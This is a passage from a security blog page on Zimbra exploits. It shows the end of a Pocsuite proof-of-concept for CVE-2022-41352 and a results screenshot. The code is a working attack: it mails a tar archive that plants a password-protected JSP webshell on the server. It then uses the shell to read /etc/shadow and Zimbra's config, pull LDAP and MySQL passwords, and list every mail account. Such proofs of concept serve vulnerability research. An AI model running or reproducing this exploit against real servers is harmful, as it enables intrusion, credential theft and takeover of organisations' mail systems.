class="string">&#x27;Subject&#x27;</span>] = subject</span><br><span class="line">        msg[<span class="string">&#x27;From&#x27;</span>] = sender</span><br><span class="line">        msg[<span class="string">&#x27;To&#x27;</span>] = recipient</span><br><span class="line"></span><br><span class="line">        message = MIMEText(body, <span class="string">&#x27;html&#x27;</span>)</span><br><span class="line">        msg.attach(message)</span><br><span class="line"></span><br><span class="line">        att = MIMEApplication(attachment)</span><br><span class="line">        att.add_header(<span class="string">&#x27;Content-Disposition&#x27;</span>, <span class="string">&#x27;attachment&#x27;</span>, filename=attachment_name)</span><br><span class="line">        msg.attach(att)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            smtp_server = smtplib.SMTP(target, <span class="number">25</span>)</span><br><span class="line">            smtp_server.sendmail(sender, recipient, msg.as_string())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">upload_webshell</span>(<span class="params">self</span>):</span><br><span class="line">        webshell_payload = <span class="string">b&quot;&quot;&quot;&lt;%@ page language=&quot;java&quot; pageEncoding=&quot;UTF-8&quot; %&gt;</span></span><br><span class="line"><span class="string">&lt;%</span></span><br><span class="line"><span class="string">    Runtime rt = Runtime.getRuntime();</span></span><br><span class="line"><span class="string">    String cmd = request.getParameter(&quot;sMuw1P2&quot;);</span></span><br><span class="line"><span class="string">    Process process = rt.exec(cmd);</span></span><br><span class="line"><span class="string">    java.io.InputStream in = process.getInputStream();</span></span><br><span class="line"><span class="string">    java.io.InputStreamReader resultReader = new java.io.InputStreamReader(in);</span></span><br><span class="line"><span class="string">    java.io.BufferedReader stdInput = new java.io.BufferedReader(resultReader);</span></span><br><span class="line"><span class="string">    String s = null;</span></span><br><span class="line"><span class="string">    while ((s = stdInput.readLine()) != null) &#123;</span></span><br><span class="line"><span class="string">        out.println(s);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">%&gt;&quot;&quot;&quot;</span></span><br><span class="line">        self.webshellPass = <span class="string">&#x27;sMuw1P2&#x27;</span></span><br><span class="line">        target = self.host</span><br><span class="line">        webshell_path = <span class="string">&#x27;/public/jsp&#x27;</span></span><br><span class="line">        self.webshellName = <span class="string">&#x27;Startup1_3.jsp&#x27;</span></span><br><span class="line">        attachment = <span class="string">&#x27;helloWorld.tar&#x27;</span></span><br><span class="line">        b = <span class="built_in">str</span>(self.host).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">        domain = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(b)):</span><br><span class="line">            <span class="keyword">if</span> i != <span class="built_in">len</span>(b) - <span class="number">1</span>:</span><br><span class="line">                domain = domain + b[i] + <span class="string">&#x27;.&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                domain = domain + b[i]</span><br><span class="line">        recipient = <span class="string">&#x27;admin@&#x27;</span> + domain</span><br><span class="line">        email_subject = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        email_body = <span class="string">&#x27;Hello World!&#x27;</span></span><br><span class="line">        upload_base = <span class="string">&#x27;/opt/zimbra/jetty_base/webapps/zimbra&#x27;</span></span><br><span class="line">        tar = self.create_tar_payload(webshell_payload, self.webshellName, upload_base+webshell_path)</span><br><span class="line">        sender = <span class="string">&#x27;anonymous@&#x27;</span> + domain</span><br><span class="line">        self.smtp_send_file(target, sender, recipient, email_subject, email_body, tar, attachment)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">execute_command</span>(<span class="params">self, command</span>):</span><br><span class="line">        data = &#123;self.webshellPass: command&#125;</span><br><span class="line">        req = requests.post(self.url + <span class="string">&#x27;/public/jsp/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName), data=data, verify=<span class="literal">False</span>, allow_redirects=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> req.text</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check_Vulnerable</span>(<span class="params">self</span>):</span><br><span class="line">        ranStr2echo = random_str(<span class="number">10</span>)</span><br><span class="line">        <span class="keyword">if</span> ranStr2echo <span class="keyword">in</span> self.execute_command(<span class="string">&#x27;echo &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(ranStr2echo)):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_title</span>(<span class="params">self</span>):</span><br><span class="line">        r = requests.get(self.url, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> r.status_code != <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;&lt;title&gt;(.+)&lt;/title&gt;&#x27;</span>)</span><br><span class="line">        url_title = re.findall(pattern, r.text)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> url_title[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_version</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmcontrol -v&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">get_ldap_and_mysql_Info</span>(<span class="params">self</span>):</span><br><span class="line">        zmlocalconfig = self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmlocalconfig -s&#x27;</span>)</span><br><span class="line">        pattern_email = re.<span class="built_in">compile</span>(<span class="string">&#x27;av_notify_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_password = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ladp_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_ldap_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_ldap_url = re.<span class="built_in">compile</span>(<span class="string">&#x27;ldap_url = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_address = re.<span class="built_in">compile</span>(<span class="string">&#x27;mysql_bind_address = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_username = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_user = (.*)&#x27;</span>)</span><br><span class="line">        pattern_mysql_Pass = re.<span class="built_in">compile</span>(<span class="string">&#x27;zimbra_mysql_password = (.*)&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            ldap_Pass = re.findall(pattern_ldap_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_user = re.findall(pattern_ladp_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            ldap_url = re.findall(pattern_ldap_url, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_address = re.findall(pattern_mysql_address, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_username = re.findall(pattern_mysql_username, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            mysql_Pass = re.findall(pattern_mysql_Pass, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            av_notify_user = re.findall(pattern_email, zmlocalconfig)[<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">return</span> ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">GetAllAccountsRequest</span>(<span class="params">self</span>):</span><br><span class="line">        pattern = re.<span class="built_in">compile</span>(<span class="string">&#x27;(\S*)&#x27;</span>)</span><br><span class="line">        users = re.findall(pattern, self.execute_command(<span class="string">&#x27;/opt/zimbra/bin/zmprov -l gaa&#x27;</span>))</span><br><span class="line">        <span class="keyword">while</span> <span class="string">&#x27;&#x27;</span> <span class="keyword">in</span> users:</span><br><span class="line">            users.remove(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> users</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_verify</span>(<span class="params">self</span>):</span><br><span class="line">        requests.packages.urllib3.disable_warnings()</span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        self.raw_url = self.url</span><br><span class="line">        self.host = urlparse(self.url).hostname</span><br><span class="line">        self.port = urlparse(self.url).port</span><br><span class="line">        <span class="keyword">if</span> self.port <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            self.port = <span class="number">443</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.upload_webshell()</span><br><span class="line">            <span class="keyword">if</span> self.check_Vulnerable():</span><br><span class="line">                result[<span class="string">&quot;url&quot;</span>] = self.url</span><br><span class="line"></span><br><span class="line">                ldap_url, ldap_user, ldap_Pass, mysql_address, mysql_username, mysql_Pass, av_notify_user = self.get_ldap_and_mysql_Info()</span><br><span class="line">                <span class="comment"># Web网站相关信息</span></span><br><span class="line">                result[<span class="string">&quot;web&quot;</span>] = &#123;</span><br><span class="line">                    <span class="comment"># 网站默认首页的title信息（可能含有单位或组织信息）</span></span><br><span class="line">                    <span class="string">&quot;title&quot;</span>: self.get_title(),</span><br><span class="line">                    <span class="string">&quot;version&quot;</span>: self.get_version(),</span><br><span class="line">                    <span class="string">&quot;all accounts&quot;</span>: self.GetAllAccountsRequest(),</span><br><span class="line">                    <span class="comment"># webshell路径及参数名</span></span><br><span class="line">                    <span class="string">&quot;webshell&quot;</span>: &#123;<span class="string">&#x27;path&#x27;</span>: <span class="string">&#x27;/zimbraAdmin/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.webshellName),</span><br><span class="line">                                 <span class="string">&quot;password&quot;</span>: self.webshellPass&#125;,</span><br><span class="line">                    <span class="string">&quot;admin notification emails&quot;</span>: av_notify_user</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment"># 凭据类信息，针对各类弱口令、默认口令漏洞</span></span><br><span class="line">                result[<span class="string">&quot;login_credentials&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: ldap_user, <span class="string">&quot;password&quot;</span>: ldap_Pass, <span class="string">&quot;ldap_url&quot;</span>: ldap_url, <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;ldap&quot;</span>&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;username&quot;</span>: mysql_username, <span class="string">&quot;password&quot;</span>: mysql_Pass, <span class="string">&quot;mysql_bind_address&quot;</span>: mysql_address,</span><br><span class="line">                     <span class="string">&quot;credential_type&quot;</span>: <span class="string">&quot;mysql&quot;</span>&#125;</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 获取的文件信息, 针对各类文件读取类漏洞</span></span><br><span class="line">                result[<span class="string">&quot;files&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;passwd&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/passwd&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/passwd&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;hosts&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/hosts&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/hosts&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;shadow&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/shadow&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/shadow&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;resolv,conf&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/etc/resolv.conf&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /etc/resolv.conf&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;localconfig.xml&quot;</span>, <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/opt/zimbra/conf/localconfig.xml&quot;</span>,</span><br><span class="line">                     <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;cat /opt/zimbra/conf/localconfig.xml&quot;</span>)&#125;,</span><br><span class="line">                ]</span><br><span class="line">                <span class="comment"># 命令执行信息, 针对各类命令执行、代码执行漏洞</span></span><br><span class="line">                result[<span class="string">&quot;commands&quot;</span>] = [</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;id&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;id&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;whoami&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;whoami&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;arp&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;arp -a&quot;</span>)&#125;,</span><br><span class="line">                    &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;ifconfig&quot;</span>, <span class="string">&quot;result&quot;</span>: self.execute_command(<span class="string">&quot;ifconfig&quot;</span>)&#125;</span><br><span class="line">                ]</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> self.parse_output(result)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_attack</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self._verify()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">parse_output</span>(<span class="params">self, result</span>):</span><br><span class="line">        output = Output(self)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(result.keys()) != <span class="number">0</span>:</span><br><span class="line">            json_result = &#123;</span><br><span class="line">                <span class="string">&quot;result&quot;</span>: &#123;<span class="string">&quot;json&quot;</span>: json.dumps(result)&#125;</span><br><span class="line">            &#125;</span><br><span class="line">            output.success(json_result)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            output.fail(<span class="string">&#x27;Internet nothing returned&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> output</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">register_poc(PoC)</span><br></pre></td></tr></table></figure>

<h3 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a><strong>运行结果</strong></h3><p><a target="_blank" rel="noopener" href="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/642beef86ea21b9a9e5832da.jpg"></a></p>
</div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
        var options = {
            selector: '.gallery-item'
        };
        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
        }</script>
  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Articles</a></li>
        
          <li><a href="/tags/">tags</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-9670-zimbra-XXE"><span class="toc-number">1.</span> <span class="toc-text">CVE-2019-9670 zimbra XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC"><span class="toc-number">1.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-27925-Zimbra%E8%B7%AF%E5%BE%84%E7%A9%BF%E8%B6%8A%E5%AF%BC%E8%87%B4%E7%9A%84RCE%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">CVE-2022-27925 Zimbra路径穿越导致的RCE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.1.</span> <span class="toc-text">漏洞原理</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E8%AE%BE%E7%BD%AE"><span class="toc-number">2.1.1.</span> <span class="toc-text">调试设置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞分析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC-1"><span class="toc-number">2.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2022-41352-Zimbra-Unauthenticated-RCE"><span class="toc-number">3.</span> <span class="toc-text">CVE-2022-41352 Zimbra Unauthenticated RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-2"><span class="toc-number">3.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pocsuite-POC-2"><span class="toc-number">3.2.</span> <span class="toc-text">Pocsuite-POC</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="toc-number">3.3.</span> <span class="toc-text">运行结果</span></a></li></ol></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://blog.rainb0w.top/2023/03/17/zimbraExploit/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&text=Zimbra Exploit"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&is_video=false&description=Zimbra Exploit"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Zimbra Exploit&body=Check out this article: https://blog.rainb0w.top/2023/03/17/zimbraExploit/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&title=Zimbra Exploit"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&name=Zimbra Exploit&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://blog.rainb0w.top/2023/03/17/zimbraExploit/&t=Zimbra Exploit"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    1970-2099
    rainb0w
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Articles</a></li><!--
     --><!--
       --><li><a href="/tags/">tags</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'r4inb00w/r4inb00w.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
